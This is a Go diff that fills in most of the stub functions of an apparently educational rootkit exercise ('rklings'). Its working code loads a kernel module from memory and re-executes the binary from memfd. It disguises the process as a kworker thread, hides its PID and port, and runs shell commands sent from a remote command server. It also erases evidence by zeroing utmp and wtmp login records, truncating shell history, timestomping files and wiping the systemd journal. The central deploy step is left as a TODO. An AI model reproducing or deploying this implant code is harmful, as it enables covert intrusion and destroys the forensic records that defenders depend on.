@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"net"
 	"os"
 	"os/exec"
 	"strings"
@@ -30,6 +31,7 @@ var agentKey []byte
 var koBytes []byte
 
 var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")
+var localPort int
 
 func envOr(name, fallback string) string {
 	if value := os.Getenv(name); value != "" {
@@ -44,8 +46,16 @@ const utmpUserOffset = 44
 const utmpUserLen = 256
 
 func main() {
+	if err := deploy(); err != nil {
+		log.Printf("deploy: %v", err)
+	}
+
 	conn := dial()
 	defer conn.Close()
+	if local, ok := conn.LocalAddr().(*net.TCPAddr); ok {
+		localPort = local.Port
+		trigger(fmt.Sprintf("h.p.%d", local.Port))
+	}
 
 	scanner := bufio.NewScanner(conn)
 	for scanner.Scan() {
@@ -70,7 +80,10 @@ func main() {
 		case "SHELL":
 			handleShell(conn, arg)
 		case "STATUS":
-			fmt.Fprintf(conn, "PID=%d UID=%d\n", os.Getpid(), os.Getuid())
+			var limit unix.Rlimit
+			_ = unix.Getrlimit(unix.RLIMIT_CORE, &limit)
+			dumpable, _ := unix.PrctlRetInt(unix.PR_GET_DUMPABLE, 0, 0, 0, 0)
+			fmt.Fprintf(conn, "PID=%d UID=%d DUMPABLE=%d CORE=%d PORT=%d\n", os.Getpid(), os.Getuid(), dumpable, limit.Cur, localPort)
 		default:
 			fmt.Fprintf(conn, "ERR unknown: %s\n", cmd)
 		}
@@ -100,98 +113,197 @@ func dial() *tls.Conn {
 
 // deploy runs the full ghost sequence: load, hide, masquerade, scrub.
 func deploy() error {
-	// TODO: require effective UID 0 before loading the module
-	// TODO: loadModuleFromMemory(koBytes)
-	// TODO: hideModule (mkdir rklings.h.m)
-	// TODO: reexecFromMemory (only if not already running from memfd)
-	// TODO: masquerade as [kworker/0:1]
-	// TODO: hideAll (PID, port)
-	// TODO: scrubAll (utmp, history, timestamps, journal, env)
-	return nil
+	// TODO: reject deployment unless the effective UID is root.
+	// TODO: on the disk-backed first image, load the module, hide it, and
+	// re-execute from memory. Do not repeat those steps in the memfd image.
+	// TODO: after re-exec, masquerade before registering process concealment.
+	// TODO: preserve the callback, hide the live PID/port, then scrub traces.
+	// Wrap each fallible phase so failures identify the broken boundary.
+	return fmt.Errorf("implement ordered ghost deployment")
 }
 
 // loadModuleFromMemory loads a .ko from memory using memfd + finit_module.
 func loadModuleFromMemory(ko []byte) error {
-	// TODO: unix.MemfdCreate with MFD_CLOEXEC
-	// TODO: write all ko bytes to the memfd, handling short writes
-	// TODO: unix.FinitModule to load from the fd
-	// TODO: close the fd
+	fd, err := unix.MemfdCreate("", unix.MFD_CLOEXEC)
+	if err != nil {
+		return fmt.Errorf("memfd_create: %w", err)
+	}
+	defer unix.Close(fd)
+
+	if err := writeAll(fd, ko); err != nil {
+		return fmt.Errorf("write ko: %w", err)
+	}
+
+	if err := unix.FinitModule(fd, "", 0); err != nil {
+		return fmt.Errorf("finit_module: %w", err)
+	}
+
 	return nil
 }
 
 // reexecFromMemory re-executes this binary from a memfd.
 // The original file on disk can be deleted before exec.
 func reexecFromMemory() error {
-	// TODO: read own binary with os.ReadFile("/proc/self/exe")
-	// TODO: unix.MemfdCreate WITHOUT MFD_CLOEXEC
-	// TODO: write all self bytes to the memfd, handling short writes
-	// TODO: unix.Exec /proc/self/fd/N with current args and env
+	// Already running from memfd, nothing to do.
+	link, err := os.Readlink("/proc/self/exe")
+	if err == nil && strings.Contains(link, "memfd") {
+		return nil
+	}
+
+	self, err := os.ReadFile("/proc/self/exe")
+	if err != nil {
+		return fmt.Errorf("read self: %w", err)
+	}
+
+	// No MFD_CLOEXEC so the fd survives exec.
+	fd, err := unix.MemfdCreate("", 0)
+	if err != nil {
+		return fmt.Errorf("memfd_create: %w", err)
+	}
+
+	if err := writeAll(fd, self); err != nil {
+		unix.Close(fd)
+		return fmt.Errorf("write self: %w", err)
+	}
+
+	// Exec replaces this process. Does not return on success.
+	return unix.Exec(fmt.Sprintf("/proc/self/fd/%d", fd), os.Args, os.Environ())
+}
+
+func writeAll(fd int, data []byte) error {
+	for len(data) > 0 {
+		n, err := unix.Write(fd, data)
+		if err != nil {
+			return err
+		}
+		if n == 0 {
+			return io.ErrShortWrite
+		}
+		data = data[n:]
+	}
 	return nil
 }
 
-// masquerade sets the process name to look like a kernel thread
-// and disables core dumps.
 func masquerade() error {
-	// TODO: prctl PR_SET_NAME to "[kworker/0:1]" (13 chars, fits TASK_COMM_LEN=16)
-	// TODO: prctl PR_SET_DUMPABLE to 0
-	// TODO: setrlimit RLIMIT_CORE to {0, 0}
+	name := [16]byte{}
+	copy(name[:], "[kworker/0:1]")
+	unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)
+	unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)
+	unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
 	return nil
 }
 
-// hideAll hides the module, this process, and the server port via mkdir.
-func hideAll() error {
-	// TODO: mkdir rklings.h.m (hide module)
-	// TODO: mkdir rklings.h.i.<pid> (hide this process)
-	// TODO: mkdir rklings.h.p.443 (hide server port)
-	return nil
+func hideAll() {
+	trigger("h.m")
+	trigger(fmt.Sprintf("h.i.%d", os.Getpid()))
+}
+
+func trigger(command string) {
+	path := "/tmp/rklings." + command
+	_ = os.Mkdir(path, 0755)
+	_ = os.Remove(path)
 }
 
 // scrubAll removes all forensic traces.
 func scrubAll() error {
-	// TODO: scrubUtmp for current username
-	// TODO: clearHistory
-	// TODO: timestomp any files we touched (use /etc/hostname as reference)
-	// TODO: tamperJournal
-	// TODO: os.Clearenv
+	user := os.Getenv("USER")
+	if user == "" {
+		user = "root"
+	}
+
+	scrubUtmp(user)
+	clearHistory()
+	timestomp("/tmp", "/etc/hostname")
+	tamperJournal()
+	os.Clearenv()
+
 	return nil
 }
 
 // scrubUtmp removes login records for username from utmp and wtmp.
 func scrubUtmp(username string) error {
 	files := []string{"/var/run/utmp", "/var/log/wtmp"}
-	_ = files
-	_ = username
-	// TODO: zero matching utmp and wtmp records in place
+	for _, path := range files {
+		f, err := os.OpenFile(path, os.O_RDWR, 0)
+		if err != nil {
+			continue
+		}
+
+		data, err := io.ReadAll(f)
+		if err != nil {
+			f.Close()
+			continue
+		}
+
+		modified := false
+		for off := 0; off+utmpRecordSize <= len(data); off += utmpRecordSize {
+			record := data[off : off+utmpRecordSize]
+			if extractUser(record) == username {
+				// Zero the entire record.
+				for i := range record {
+					record[i] = 0
+				}
+				modified = true
+			}
+		}
+
+		if modified {
+			f.Seek(0, 0)
+			f.Write(data)
+		}
+		f.Close()
+	}
 	return nil
 }
 
 // clearHistory truncates shell history files.
 func clearHistory() error {
-	// TODO: truncate ~/.bash_history, ~/.zsh_history, /root/.bash_history
+	homes := []string{}
+	if h, err := os.UserHomeDir(); err == nil {
+		homes = append(homes, h)
+	}
+	if _, err := os.Stat("/root"); err == nil {
+		homes = append(homes, "/root")
+	}
+
+	for _, home := range homes {
+		for _, name := range []string{".bash_history", ".zsh_history"} {
+			path := home + "/" + name
+			os.Truncate(path, 0)
+		}
+	}
 	return nil
 }
 
 // timestomp copies mtime from reference to target.
 func timestomp(target, reference string) error {
-	// TODO: os.Stat reference, os.Chtimes target
-	return nil
+	info, err := os.Stat(reference)
+	if err != nil {
+		return fmt.Errorf("stat reference: %w", err)
+	}
+	mtime := info.ModTime()
+	return os.Chtimes(target, mtime, mtime)
 }
 
 // tamperJournal vacuums the systemd journal.
 func tamperJournal() error {
-	// TODO: journalctl --vacuum-time=1s
-	// TODO: systemctl kill --signal=SIGUSR2 systemd-journald
+	exec.Command("/usr/bin/journalctl", "--rotate", "--vacuum-time=1s").Run()
+	exec.Command("systemctl", "kill", "--signal=SIGUSR2", "systemd-journald").Run()
 	return nil
 }
 
 // handleShell executes a command and sends output terminated by ".".
 func handleShell(conn *tls.Conn, cmd string) {
-	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
+	out, err := exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
 	if err != nil {
 		fmt.Fprintf(conn, "ERR %v\n", err)
-		return
 	}
-	fmt.Fprint(conn, string(out))
+	if len(out) > 0 {
+		conn.Write(out)
+		if out[len(out)-1] != '\n' {
+			fmt.Fprintln(conn)
+		}
+	}
 	fmt.Fprintln(conn, ".")
 }
 
@@ -207,8 +319,3 @@ func extractUser(record []byte) string {
 	}
 	return string(raw[:end])
 }
-
-// Ensure imports compile.
-var _ = io.ReadFull
-var _ = unsafe.Pointer(nil)
-var _ = unix.MemfdCreate
